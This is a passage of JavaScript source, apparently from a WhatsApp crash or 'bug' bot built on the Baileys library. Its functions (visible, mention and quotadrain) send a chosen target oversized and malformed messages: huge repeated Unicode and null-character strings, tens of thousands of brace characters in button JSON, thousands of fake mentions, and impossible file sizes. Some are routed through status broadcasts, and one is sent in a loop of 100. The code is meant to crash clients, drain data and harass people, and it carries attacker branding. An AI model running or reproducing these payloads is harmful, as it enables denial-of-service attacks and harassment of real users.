⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(20000),
      caption: "Marga #6VX Neverdiee!!" + ":҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(20000),
      jpegThumbnail: null, 
    }, 
  };
  await sock.relayMessage(target, msg, {
    participant: { jid: target }, 
    messageId: null, 
  });
}

//

async function visible1(sock, target) {
  sock.sendMessage(target, {
  text: 'Marga #6VX Neverdiee!!' + 'ꦽ'.repeat(5000),
  interactiveButtons: [
      {
        name: "payment_method",
        buttonParamsJson: "{".repeat(50000) + "(".repeat(50000),
      }
    ]
  });
}

async function visible2(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { 
                text: "Marga #6VX Neverdiee!!" + "\u0000".repeat(9000)
              }, 
              footer: {
                text: "\n".repeat(100)
              }, 
              nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                  limited_time_offer: {
                    text: "Marga #6VX Neverdiee!!", 
                    url: "https://t.me/VINSEXEJT1", 
                    copy_code: "𑲭".repeat(9000), 
                    expiration_time: Date.now() * 250208
                  }
                }),
                buttons: [
                  { 
                    name: "mpm", 
                    buttonParamsJson: JSON.stringify({ status: true })
                  },
                  { 
                    name: "mpm",
                    buttonParamsJson: JSON.stringify({ status: true })
                  }
                ]
              },
              contextInfo: {
                participant: target,
                mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 1999 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)],
                remoteJid: target, 
                stanzaId: "123",
                quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() / 7
                },
                isForwarded: true, 
                forwardingScore: 9999,
                forwardedNewsletterMessageInfo: {
                  newsletterName: "Marga #6VX Neverdiee!!",
                  newsletterJid: "120363330289360382@newsletter",
                  serverId: 7
                }
              }
            }
          }
        }
      }
    }, { userJid: target } 
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });
}

async function visible3(sock, target) {
  const VaelMsg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "Marga #6VX Neverdiee!!".repeat(1500),
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 9007199254740991,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "\n\n\nX\n\n\n",
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: false,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "Marga #6VX Neverdiee!!" + "𞋯" + "ꦾ".repeat(15000),
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "{\"title\":\"SX\\>🍷𞋯\",\"sections\":[{\"title\":\"ϟ\",\"rows\":[]}]}",
              },
              {
                name: "galaxy_message",
                buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"️DOCUMENT\",\"flow_id\":\"SX\",\"flow_message_version\":\"9\",\"flow_token\":\"SX\"}"
              }
            ]
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(VaelMsg), { userJid: target });
  try {
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (err) {
    console.error(err);
  }
}

async function visible4(sock, target) {
  const media = await prepareWAMessageMedia(
    { image: { url: thumbnailUrl } },
    { upload: sock.waUploadToServer }
  )

  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: media.imageMessage,
            hasMediaAttachment: true,
          },
          body: {
            text: "Marga #6VX Neverdiee!!" + "ꦽ".repeat(50000),
          },
          footerText: "\u0000",
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "REVIEW",
                  flow_cta: "\u0000".repeat(10000),
                  flow_message_version: "3",
                }),
              },
              {
                name: "payment_method",
                buttonParamsJson: JSON.stringify({
                  reference_id: null,
                  payment_method: "DEMO",
                  payment_timestamp: null,
                  share_payment_status: true,
                }),
              },
            ],
            messageParamsJson: "{}",
          },
          contextInfo: {
            remoteJid: target,
            participant: "0@s.whatsapp.net",
            mentionedJid: ["0@s.whatsapp.net"],
            urlTrackingMap: {
              urlTrackingMapElements: [
                {
                  originalUrl: "https://t.me/VINSEXEJT1",
                  unconsentedUsersUrl: "https://t.me/VINSEXEJT1",
                  consentedUsersUrl: "https://t.me/VINSEXEJT1",
                  cardIndex: 1,
                },
                {
                  originalUrl: "https://t.me/VINSEXEJT1",
                  unconsentedUsersUrl: "https://t.me/VINSEXEJT1",
                  consentedUsersUrl: "https://t.me/VINSEXEJT1",
                  cardIndex: 2,
                },
              ],
            },
          },
          quotedMessage: {
            interactiveMessage: {
              body: { text: "Marga #6VX Neverdiee!!" + "ꦽ".repeat(20000) },
              footerText: "\u0000",
            },
          },
        },
      },
    },
  }
  await sock.relayMessage(target, msg, {})
}


//

async function mention1(sock, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
        },
      },
    },
  };
  
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Marga #6VX Neverdiee!!",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
    for (let i = 0; i < 100; i++) {
  const janda = generateWAMessageFromContent(target, message, {});

        await sock.relayMessage("status@broadcast", message.message, {
            messageId: message.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });
        
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });
        
        console.log(`Sent message ${i + 1}/100`);
        if (i < 99) {
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

async function mention2(target, mention) {
  try {
    const generateMessage = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/d/f/At0x7O0hR5tqD3d7xqO1ZGh6h3R1sX2C7r5XQe5yT3hVv.enc", 
            mimetype: "image/webp",
            fileSha256: "a2X3MzT3R2eZ3v9C7p0zV8h2L0xJv3Qw1B7M4Qx2YhI=",
            fileEncSha256: "c9W7QhS3O9nM6t4Wv0E4r8A2h3B3T5K2o6L8s7C1yX3=",
            mediaKey: "Z7C3YxK2r9R8u6M2f1V5o0Q7n3L1t8D6yB4e2p9O3gE=",
            fileLength: "28761",
            height: 512,
            width: 512,
            mediaKeyTimestamp: "1743225419",
            firstFrameLength: 0,
            firstFrameSidecar: "AAAA",
            isAnimated: true,
            directPath: "/v/t62.15575-24/StickerPack.enc?ccb=11-4",
            jpegThumbnail: null,
            contextInfo: {
              mentionedJid: Array.from(
                { length: 10000 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              ),
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 1024,
              isForwarded: true,
              externalAdReply: {
                title: "Sticker Pack!!",
                body: "Marga #6VX Neverdiee!!",
                previewType: "sticker_pack",
                thumbnailUrl: "https://files.catbox.moe/sock.webp",
                sourceUrl: "https://wa.me/stickerpack/sock"
              }
            }
          }
        }
      }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(target, {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25
              }
            }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "true" },
              content: undefined
            }
          ]
        }
      );
    }
  } catch (err) {
    console.error(err);
  }
}

async function mention3(sock, target) {
  const VaelLoca = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0.000000,
          degreesLongitude: 0.000000,
          name: "Marga #6VX Neverdiee!!" + "ꦽ".repeat(1500),
          address: "Marga #6VX Neverdiee!!" + "ꦽ".repeat(1000),
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: target,
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent("status@broadcast", VaelLoca, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  }, { participant: target });
}

async function mention4(sock, target) {
    const stickerMsg = {
  message: {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
      mimetype: "image/webp",
      fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
      fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
      mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
      fileLength: 1173741,
      mediaKeyTimestamp: Date.now(),
      isAnimated: false,
      directPath: "/v/t62.7118-24/sample_sticker.enc",
      contextInfo: {
        mentionedJid: [
          target,
          ...Array.from({ length: 50 }, () =>
            "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
        ],
        participant: target,
        remoteJid: "status@broadcast",
      },
    },
  },
};

const msg = generateWAMessageFromContent(target, stickerMsg.message, {});

await sock.relayMessage("status@broadcast", msg.message, {
  messageId: msg.key.id,
  statusJidList: [target],
  additionalNodes: [
    {
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target },
              content: []
            },
          ],
        },
      ],
    },
  ],
});
}

//

async function quotadrain1(sock, target) {
  const repeatStr = (str, times) => str.repeat(times);
  const newsletterMsg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363330289360382@newsletter",
      newsletterName: "Marga #6VX Neverdiee!!" + repeatStr("ោ៝", 20000),
      caption: "Marga #6VX Neverdiee!!" + repeatStr("ោ៝", 30000),
      inviteExpiration: "999999999",
    },
  };
  await sock.relayMessage(target, newsletterMsg, {
    participant: { jid: target },
    messageId: null,
  });

  const buttons = [
    "single_select",
    "call_permission_request",
    "cta_url",
    "cta_call",
    "cta_copy",
    "cta_reminder",
    "cta_cancel_reminder",
    "address_message",
    "send_location",
    "quick_reply",
    "mpm",
  ].map((name) => ({ name, buttonParamsJson: "{}".repeat(1000) }));

  const viewOnceMsg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "\n\n\nX\n\n\n",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: { text: "Marga #6VX Neverdiee!!" + repeatStr("ꦾ", 10000) },
          nativeFlowMessage: { buttons },
        },
      },
    },
  };

  await sock.relayMessage(target, viewOnceMsg, {
    participant: { jid: target },
  });
}

async function quotadrain2(sock, target) {
const msg = "Marga #6VX Neverdiee!!" + "᬴᬴᬴".repeat(15000) + "꧔꧈".repeat(15000) + "ꦽ".repeat(20000);
  await sock.sendMessage(target, {
    eventMessage: {
        isCanceled: false,
        name: msg,
        description: msg,
        location: {
            degreesLatitude: 0,
            degreesLongitude: 0,
            name: msg
        },
        joinLink: "https://call.whatsapp.com/video/sock",
        startTime: Math.floor(Date.now() / 1000),
        endTime: Math.floor(Date.now() / 1000) + 86400,
        extraGuestsAllowed: false
    }
}, { quoted: null });
}

async function quotadrain3(sock, target) {
  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }
    }
  }

  const msg = generateWAMessageFromContent(target, message, {})

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  })
}

async function quotadrain4(target, mention) {
  try {
    const VaelVar = []
    for (let i = 1045000000; i <= 1045000000; i++) {
      VaelVar.push({
        image: {
          url: "https://files.catbox.moe/qrqzlw.jpg",
          mimetype: "image/jpeg"
        },
